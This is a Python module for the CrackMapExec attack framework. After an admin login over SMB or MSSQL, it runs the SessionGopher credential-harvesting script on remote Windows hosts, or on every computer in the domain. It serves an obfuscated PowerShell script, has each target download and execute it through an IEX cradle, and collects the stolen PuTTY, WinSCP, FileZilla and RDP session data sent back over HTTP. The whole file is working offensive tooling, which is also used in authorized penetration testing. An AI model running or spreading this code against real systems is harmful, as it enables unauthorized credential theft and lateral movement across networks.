from cme.helpers.powershell import *
from cme.helpers.logger import write_log
from io import StringIO
from datetime import datetime

class CMEModule:
    '''
        Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
        https://github.com/fireeye/SessionGopher

        Module by @byt3bl33d3r

    '''

    name = 'invoke_sessiongopher'
    description = 'Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher'
    supported_protocols = ['smb', 'mssql']
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        THOROUGH   Searches entire filesystem for certain file extensions (default: False)
        ALLDOMAIN  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them (default: False)
        '''

        self.thorough   = False
        self.all_domain = False

        if 'THOROUGH' in module_options:
            self.thorough = bool(module_options['THOROUGH'])

        if 'ALLDOMAIN' in module_options:
            self.all_domain = bool(module_options['ALLDOMAIN'])

        self.ps_script2 = obfs_ps_script('sessiongopher/SessionGopher.ps1')

    def on_admin_login(self, context, connection):
        command = 'Invoke-SessionGopher'
        if self.thorough:
            command += ' -Thorough'
        if self.all_domain:
            command += ' -AllDomain'

        command += ' | Out-String'

        launcher = gen_ps_iex_cradle(context, 'SessionGopher.ps1', command)

        connection.ps_execute(launcher)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'SessionGopher.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data):
            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            print_post_data(data)

            log_name = 'SessionGopher-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
